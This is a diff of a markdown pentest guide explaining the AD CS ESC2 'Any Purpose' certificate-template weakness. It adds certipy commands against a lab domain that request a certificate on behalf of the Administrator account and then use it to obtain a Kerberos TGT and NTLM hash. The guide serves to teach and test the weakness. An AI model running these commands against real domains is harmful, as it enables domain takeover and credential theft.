@@ -1,3 +1,5 @@
+# ESC2 Any Purpose Certificate Template
+
 The vulnerability materializes when these conditions are met:
 - **Template with "Any Purpose" or No EKU:** The template either explicitly contains the "Any Purpose" EKU or has no EKUs defined (which implies any purpose).
 - **Permissive Enrollment Rights:** Low-privileged users (e.g., members of "Domain Users" or "Authenticated Users") are granted enrollment permissions for this template.
@@ -36,4 +38,21 @@ certipy req \
     -dc-ip '10.10.111.10' -target 'DC01.LOL.LOCAL' \
     -ca 'LOL-CA' -template 'User' \
     -pfx 'attacker.pfx' -on-behalf-of 'LOL\Administrator'
+
+
+# -template 'User': The target template that allows agent enrollment and issues authentication certificates.
+
+# -pfx 'attacker.pfx': Specifies the attacker's own certificate, which will be used as the enrollment agent certificate.
+
+# -on-behalf-of 'LOL\Administrator': Specifies the target user for whom the new certificate is being requested. This must be in the <DOMAIN_NETBIOS_NAME>\<SAM_ACCOUNT_NAME> format.
+
 ```
+This creates `administrator.pfx`, a certificate valid for the `Administrator` account, issued to the attacker.
+
+**Step 3: Authenticate using the "on-behalf-of" certificate:**
+he attacker uses the `administrator.pfx` (obtained in Step 2) to authenticate as the Administrator.
+
+```bash
+certipy auth -pfx 'administrator.pfx' -dc-ip '10.10.111.10'
+```
+The attacker successfully obtains a Kerberos TGT and the NTLM hash for the Administrator account.
